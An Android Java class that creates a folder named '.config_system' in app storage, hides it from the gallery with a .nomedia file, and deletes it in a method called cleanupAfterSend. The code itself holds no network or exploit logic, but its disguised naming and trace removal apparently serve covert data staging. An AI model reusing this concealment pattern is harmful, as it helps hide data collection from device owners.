package com.alzahra.storage;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;

public class HiddenStorageManager {
    
    private static final String TAG = "HiddenStorage";
    private static final String HIDDEN_DIR = ".config_system";
    private static File hiddenFolder;

    public static void initialize(Context context) {
        if (hiddenFolder != null && hiddenFolder.exists()) {
            return;
        }
        
        try {
            File baseDir;
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                baseDir = context.getExternalFilesDir(null);
                if (baseDir == null) {
                    baseDir = context.getFilesDir();
                }
            } else {
                baseDir = context.getFilesDir();
            }
            
            hiddenFolder = new File(baseDir, HIDDEN_DIR);
            
            if (!hiddenFolder.exists()) {
                boolean created = hiddenFolder.mkdirs();
                Log.d(TAG, "Hidden folder created: " + created);
            }
            
            // Create .nomedia to hide from gallery
            File nomedia = new File(hiddenFolder, ".nomedia");
            if (!nomedia.exists()) {
                nomedia.createNewFile();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Initialization failed", e);
        }
    }

    public static File getHiddenFolder(Context context) {
        if (hiddenFolder == null || !hiddenFolder.exists()) {
            initialize(context);
        }
        return hiddenFolder;
    }

    public static void cleanupAfterSend(Context context) {
        try {
            File folder = getHiddenFolder(context);
            if (folder != null && folder.exists()) {
                deleteRecursive(folder);
            }
        } catch (Exception e) {
            Log.e(TAG, "Cleanup failed", e);
        }
    }

    private static void deleteRecursive(File file) {
        if (file.isDirectory() && file.listFiles() != null) {
            for (File child : file.listFiles()) {
                deleteRecursive(child);
            }
        }
        file.delete();
    }
}
